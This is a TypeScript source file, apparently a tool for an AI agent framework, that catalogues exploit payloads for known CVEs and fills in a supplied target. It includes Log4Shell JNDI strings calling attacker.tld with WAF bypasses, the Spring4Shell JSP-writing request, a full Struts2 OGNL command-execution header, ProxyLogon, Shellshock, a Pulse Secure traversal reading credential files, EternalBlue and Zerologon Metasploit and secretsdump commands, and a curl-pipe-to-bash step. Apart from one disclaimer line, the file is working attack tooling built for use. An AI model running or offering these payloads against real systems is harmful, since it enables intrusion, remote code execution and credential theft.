import { Tool } from "./tool"
import z from "zod"

const DESCRIPTION =
  "Catalog of curated CVE proof-of-concept payloads and exploitation commands. Returns ready-to-run snippets (curl, requests, nuclei templates) for known vulnerabilities. Authorized testing only."

const PARAMETERS = z.object({
  query: z.string().describe("CVE id (e.g., CVE-2021-44228) or search term (e.g., 'log4j', 'spring4shell')"),
  target: z.string().optional().describe("Target URL/host to substitute into payload"),
})

type Poc = {
  id: string
  name: string
  refs: string[]
  tags: string[]
  payload: (target: string) => string
  notes: string
}

const CATALOG: Poc[] = [
  {
    id: "CVE-2021-44228",
    name: "Log4Shell (Log4j RCE)",
    tags: ["log4j", "rce", "java"],
    refs: ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
    payload: (t) =>
      `# Send to any logged input (User-Agent, headers, form fields):
curl -H 'User-Agent: \${jndi:ldap://attacker.tld/a}' '${t}'
# Common WAF bypasses:
\${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://attacker.tld/a}
\${jndi:dns://attacker.tld/x}`,
    notes: "Use interactsh / burp collaborator for OOB. Requires JNDI-vulnerable JDK.",
  },
  {
    id: "CVE-2022-22965",
    name: "Spring4Shell (Spring Core RCE)",
    tags: ["spring", "rce", "java"],
    refs: ["https://tanzu.vmware.com/security/cve-2022-22965"],
    payload: (t) =>
      `curl -X POST '${t}' \\
  -H 'suffix: %>//' -H 'c1: Runtime' -H 'c2: <%' \\
  --data 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='`,
    notes: "Requires Spring on Tomcat with JDK 9+ and DataBinder.",
  },
  {
    id: "CVE-2017-5638",
    name: "Apache Struts2 OGNL RCE",
    tags: ["struts", "rce", "java", "ognl"],
    refs: ["https://nvd.nist.gov/vuln/detail/CVE-2017-5638"],
    payload: (t) =>
      `curl '${t}' -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"`,
    notes: "Classic Equifax-style RCE via Content-Type header.",
  },
  {
    id: "CVE-2021-26855",
    name: "ProxyLogon (Exchange SSRF -> RCE)",
    tags: ["exchange", "ssrf", "rce", "microsoft"],
    refs: ["https://nvd.nist.gov/vuln/detail/CVE-2021-26855"],
    payload: (t) =>
      `# Auth bypass via SSRF cookie:
curl -k '${t}/owa/auth/x.js' -H 'Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3'`,
    notes: "Chain with CVE-2021-27065 for arbitrary file write -> RCE.",
  },
  {
    id: "CVE-2014-6271",
    name: "Shellshock (bash env injection)",
    tags: ["bash", "rce", "cgi"],
    refs: ["https://nvd.nist.gov/vuln/detail/CVE-2014-6271"],
    payload: (t) => `curl '${t}' -H 'User-Agent: () { :;}; /bin/bash -c "id"'`,
    notes: "CGI scripts that pass headers to bash environment.",
  },
  {
    id: "CVE-2019-11510",
    name: "Pulse Secure VPN file read",
    tags: ["pulse", "vpn", "lfi"],
    refs: ["https://nvd.nist.gov/vuln/detail/CVE-2019-11510"],
    payload: (t) =>
      `curl '${t}/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/'`,
    notes: "Read /etc/passwd and credential cache files.",
  },
  {
    id: "CVE-2023-46604",
    name: "Apache ActiveMQ OpenWire RCE",
    tags: ["activemq", "rce", "java"],
    refs: ["https://nvd.nist.gov/vuln/detail/CVE-2023-46604"],
    payload: (t) =>
      `# OpenWire on tcp/61616, send marshalled ExceptionResponse with Spring ClassPathXmlApplicationContext URL pointing to attacker XML
nuclei -t http/cves/2023/CVE-2023-46604.yaml -u ${t}`,
    notes: "Use msfconsole exploit/multi/misc/apache_activemq_rce_cve_2023_46604.",
  },
  {
    id: "CVE-2017-0144",
    name: "EternalBlue (SMBv1 RCE)",
    tags: ["smb", "rce", "windows", "ms17-010"],
    refs: ["https://nvd.nist.gov/vuln/detail/CVE-2017-0144"],
    payload: (t) =>
      `nmap --script smb-vuln-ms17-010 -p445 ${t}\n# Exploit: msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS ${t}; run'`,
    notes: "Pre-auth RCE on SMBv1. Patch MS17-010.",
  },
  {
    id: "CVE-2020-1472",
    name: "Zerologon (Netlogon AD)",
    tags: ["ad", "netlogon", "domain", "windows"],
    refs: ["https://nvd.nist.gov/vuln/detail/CVE-2020-1472"],
    payload: (t) => `python3 zerologon_tester.py DC01 ${t}\n# Exploit: secretsdump.py -no-pass -just-dc 'DC01$@${t}'`,
    notes: "Reset DC machine account password to empty.",
  },
  {
    id: "CVE-2024-3094",
    name: "XZ Utils backdoor (sshd)",
    tags: ["xz", "ssh", "supply-chain"],
    refs: ["https://nvd.nist.gov/vuln/detail/CVE-2024-3094"],
    payload: () => `# Detect: xz --version  -> liblzma 5.6.0 / 5.6.1
# Triggered by ED448 key in SSH cert. Detection script:
curl -fsSL https://raw.githubusercontent.com/byinarie/CVE-2024-3094-info/main/detect.sh | bash`,
    notes: "Affects Debian sid, Fedora 40/41 rawhide, openSUSE Tumbleweed builds Mar 2024.",
  },
]

export const CVEPocTool = Tool.define("cve_poc", {
  description: DESCRIPTION,
  parameters: PARAMETERS,
  async execute(params) {
    const q = params.query.toLowerCase()
    const target = params.target ?? "https://target.example.com"
    const matches = CATALOG.filter(
      (c) => c.id.toLowerCase().includes(q) || c.name.toLowerCase().includes(q) || c.tags.some((t) => t.includes(q)),
    )
    if (!matches.length) {
      const list = CATALOG.map((c) => `- **${c.id}** — ${c.name} (${c.tags.join(", ")})`).join("\n")
      return {
        title: "CVE PoC",
        output: `## No match for "${params.query}"\n\n### Available PoCs\n\n${list}`,
        metadata: { action: "cve_poc", matched: 0 } as Record<string, any>,
      }
    }
    let out = `## CVE PoCs matching "${params.query}"\n\n`
    for (const m of matches) {
      out += `### ${m.id} — ${m.name}\n\n**Tags**: ${m.tags.join(", ")}\n\n**Payload**:\n\n\`\`\`bash\n${m.payload(target)}\n\`\`\`\n\n**Notes**: ${m.notes}\n\n**Refs**: ${m.refs.join(", ")}\n\n---\n\n`
    }
    return {
      title: "CVE PoC",
      output: out,
      metadata: { action: "cve_poc", matched: matches.length, ids: matches.map((m) => m.id) } as Record<string, any>,
    }
  },
})
